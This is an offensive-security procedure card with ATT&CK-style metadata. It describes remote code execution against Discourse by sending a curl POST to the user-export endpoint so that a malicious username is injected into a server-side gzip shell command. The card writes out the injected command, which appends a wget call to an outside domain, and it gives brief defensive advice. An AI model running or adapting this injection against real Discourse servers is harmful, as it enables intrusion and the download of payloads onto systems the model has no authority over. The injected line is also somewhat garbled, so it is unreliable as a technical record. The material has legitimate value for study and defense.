---
id: proc-trigger-cmd-inj-export
tags:
  - rce
  - export
  - command-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/post-user-export]]'
  - '[[commands/gzip-vulnerable-compress]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:30:07.560Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Trigger-Command-Injection-via-User-Export

## Summary

This procedure sends a request to generate a user archive export in Discourse, triggering the vulnerable ExportCsvFile job where the malicious username is interpolated into a gzip shell command, resulting in RCE.

## Description

The user_archive export feature compresses CSV data using a shell command that includes the username in the file path without sanitization. When the malicious username is processed, it executes injected commands on the server. This exploits web apps with admin features and assumes prior setup via backup. Expected outcome: Arbitrary shell commands run as the app user.

## Requirements

1. Session as the modified user account
2. Access to export API endpoint
3. Server running vulnerable Discourse version
4. Tools like curl for POST requests

## Defense

Defensive measures and detection strategies:

- Sanitize usernames in all shell contexts, using safe path construction
- Avoid shell commands for file operations; use libraries like Ruby's Zlib
- Monitor export jobs for errors or unusual command executions
- Log and alert on gzip or wget processes spawned from web jobs

## Objectives

1. Initiate export to invoke vulnerable job
2. Execute injected shell payload for RCE
3. Confirm impact like file download or creation

## Instructions

### Step 1: Send Export Request

**Context**: POST to the export endpoint to queue the user_archive generation.

**Command** ([[commands/post-user-export]]):
```bash
curl -X POST http://target/export_csv/export_entity.json -d 'entity_type=user&entity=user_archive'
```

> This triggers the ExportCsvFile job. Expected: 200 OK response, job queued.

### Step 2: Await and Trigger Injection

**Context**: The server runs the gzip command with the malicious path.

**Command** ([[commands/gzip-vulnerable-compress]]):
```bash
`gzip -5 /path/to/user/test.txt;wget mrzioto.com.csv.gz`
```

> The backticks execute the shell command, injecting the payload. Expected: Payload runs, e.g., test.txt created, content downloaded.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/post-user-export]]
- [[commands/gzip-vulnerable-compress]]

## Tools Used


## Tags

- rce
- export
- command-injection
